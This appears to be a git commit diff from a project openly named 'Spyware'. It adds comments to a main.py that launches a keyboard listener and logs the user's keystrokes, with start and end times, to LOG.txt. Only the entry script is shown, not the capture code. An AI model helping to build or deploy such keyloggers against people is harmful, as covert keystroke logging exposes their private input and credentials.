985df90f9f82bc30bce1f8d413329bc459686055
Hjt <ronaldohjt2@gmail.com>
2024-03-31 15:16:03 +0330

    docs(main.py)
    Added docstring for keyboard tracking commands in the main.py

--- Spyware/main.py
+++ Spyware/main.py
@@ -1,6 +1,6 @@
 from Logger.tracker import keyboard_listener, save_time
 
 if __name__ == '__main__':
-    save_time('Logger/LOG.txt', 'Started at ')
-    keyboard_listener()
-    save_time('Logger/LOG.txt', 'Ended at ', extra_endline=True)
+    save_time('Logger/LOG.txt', 'Started at ')  # Saves the start time in LOG.txt
+    keyboard_listener()  # Tracks the use keyboard inputs and saves them in LOG.txt
+    save_time('Logger/LOG.txt', 'Ended at ', extra_endline=True)  # Saves the end time in LOG.txt
